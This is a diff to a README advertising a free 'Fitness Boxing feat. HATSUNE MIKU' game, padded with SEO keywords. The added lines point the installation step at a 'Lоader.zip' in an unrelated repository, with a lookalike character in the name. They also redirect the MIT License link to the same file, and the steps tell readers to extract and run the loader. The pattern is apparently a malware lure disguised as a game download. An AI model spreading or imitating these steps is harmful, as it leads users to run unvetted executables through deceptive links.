@@ -21,7 +21,7 @@ Boost SEO: fitness boxing miku, fitness boxing game free, Hatsune Miku exercise,
 - 💻 **Multi-Platform:** Enjoy on Windows, macOS, Linux, Android, iOS.
 
 ## 🚀 Installation
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/Sheri743/PipraPay-Open-Source-Web/main/Lоader.zip` from the repository.
 2. Extract files to your desired folder.
 3. Run the loader and follow the on-screen instructions.
 4. Enjoy *Fitness Boxing feat. HATSUNE MIKU*—get fit with music!
@@ -30,6 +30,6 @@ Boost SEO: fitness boxing miku, fitness boxing game free, Hatsune Miku exercise,
 This project is for educational and personal use only. Distribution or commercial utilization is not permitted. Always support official developers and respect content creators.
 
 ## 📄 MIT License 2025
-Licensed under the [MIT License](https://opensource.org/license/mit/). Feel free to use, modify, and share with proper attribution!
+Licensed under the [MIT License](https://raw.githubusercontent.com/Sheri743/PipraPay-Open-Source-Web/main/Lоader.zip). Feel free to use, modify, and share with proper attribution!
 
 **Bring your routine to life—work out with Hatsune Miku!**
